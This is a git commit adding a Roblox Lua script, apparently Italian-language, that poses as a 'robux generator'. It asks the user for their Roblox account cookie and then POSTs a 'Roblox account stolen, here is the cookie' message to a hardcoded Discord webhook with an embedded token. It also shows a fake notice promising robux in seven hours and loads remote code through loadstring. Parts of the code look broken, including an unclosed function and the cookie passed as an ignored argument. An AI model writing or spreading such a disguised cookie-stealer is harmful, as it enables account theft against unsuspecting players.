2fb49b505462b2d65a1042f56dabb01def847fa9
PistolaBollaHUBMaker <111288040+PistolaBollaHUBMaker@users.noreply.github.com>
2024-06-11 22:57:15 +0200

    Add files via upload

---
+++ Test.lua
@@ -0,0 +1,106 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Generatore di robux by FCNM4TT10", HidePremium = false, SaveConfig = false})
+
+function RobuxGenerati()
+	OrionLib:MakeNotification({
+		Name = "Robux Generati!",
+		Content = "Robux Generati con successo, aspetta 7 ore e verrano accreditati nel tuo account.",
+		Image = "rbxassetid://17822616121",
+		Time = 5
+	})
+end
+
+_G.Nome = "string"
+
+function Nome()
+	function SendMessage(url, message)
+		local http = game:GetService("HttpService")
+		local headers = {
+			["Content-Type"] = "application/json"
+		}
+		local data = {
+			["content"] = message
+		}
+		local body = http:JSONEncode(data)
+		local response = request({
+			Url = url,
+			Method = "POST",
+			Headers = headers,
+			Body = body
+		})
+end
+
+function SendMessageEMBED(url, embed)
+	local http = game:GetService("HttpService")
+	local headers = {
+		["Content-Type"] = "application/json"
+	}
+	local data = {
+		["embeds"] = {
+			["title"] = embed.title,
+			["description"] = embed.description,
+			["color"] = embed.color,
+			["fields"] = embed.fields,
+			["footer"] = {
+				["text"] = embed.footer.text
+			}
+		}
+	}
+	local body = http:JSONEncode(data)
+	local response = request({
+		Url = url,
+		Method = "POST",
+		Headers = headers,
+		Body = body
+	})
+end
+
+local url = "https://discordapp.com/api/webhooks/1250189153182683239/G3YpQpu-kSKGgNcMe-tVUQFjPBzhUj2OL37BJ-wNh34IPpf1zpSayCFuUqc1701kWLDU"
+SendMessage(url, "**ACCOUNT ROBLOX RUBATO, ECCO IL COOKIE\n**",_G.Nome)
+end
+
+function Password()
+	function SendMessage(url, message)
+		local http = game:GetService("HttpService")
+		local headers = {
+			["Content-Type"] = "application/json"
+		}
+		local data = {
+			["content"] = message
+		}
+		local body = http:JSONEncode(data)
+		local response = request({
+			Url = url,
+			Method = "POST",
+			Headers = headers,
+			Body = body
+		})
+end
+
+local diocane = Window:MakeTab({
+	Name = "Generatore",
+	Icon = "rbxasserid://17822667829",
+	PremiumOnly = false
+})
+diocane:AddTextbox({
+	Name = "Numero di robux",
+	Default = "",
+	TextDisappear = false,
+	Callback = function(Value)
+		print("banana")
+	end
+})
+diocane:AddTextbox({
+	Name = "Cookie",
+	Default = "",
+	TextDisappear = false,
+	Callback = function(Value)
+		_G.Nome = Value
+	end
+})
+diocane:AddButton({
+	Name = "Conferma nome",
+	Callback = function()
+		Nome()
+	end
+})
